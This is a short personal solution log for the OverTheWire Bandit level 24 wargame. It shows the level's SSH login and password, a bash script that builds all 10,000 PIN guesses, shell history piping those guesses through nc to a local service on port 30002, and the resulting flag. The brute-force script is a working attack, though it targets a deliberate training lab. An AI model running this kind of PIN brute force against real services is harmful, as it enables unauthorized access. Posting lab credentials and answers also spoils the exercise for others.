login: ssh -p 2220 bandit24@bandit.labs.overthewire.org
pwd: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```
cd /tmp/patryk2
touch a.sh
chmod 700 a.sh

___SCRIPT___
#!/bin/bash
for i in {0..9};do
	for j in {000..999};do
		echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i$j" >> pass$i.txt
	done
done
____________

seperated bacause the port stops accepting after a few tries
next i manually did
   94  cat pass0.txt | nc localhost 30002 | grep -v "Wrong"
   95  cat pass1.txt | nc localhost 30002 | grep -v "Wrong"
   96  cat pass2.txt | nc localhost 30002 | grep -v "Wrong"
   97  cat pass3.txt | nc localhost 30002 | grep -v "Wrong"
   98  cat pass5.txt | nc localhost 30002 | grep -v "Wrong"
   99  cat pass4.txt | nc localhost 30002 | grep -v "Wrong"
  100  cat pass6.txt | nc localhost 30002 | grep -v "Wrong"
  101  cat pass7.txt | nc localhost 30002 | grep -v "Wrong"
  102  cat pass8.txt | nc localhost 30002 | grep -v "Wrong"
  103  cat pass9.txt | nc localhost 30002 | grep -v "Wrong"
  bacause a script i wrote stopped at 7. Something to look into.
  
___rd.sh___
for i in {0..9};do
	timeout 5 cat pass$i.txt | nc localhost 30002 | grep -v "Wrong" >> out.txt
done
___________
```

flag: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d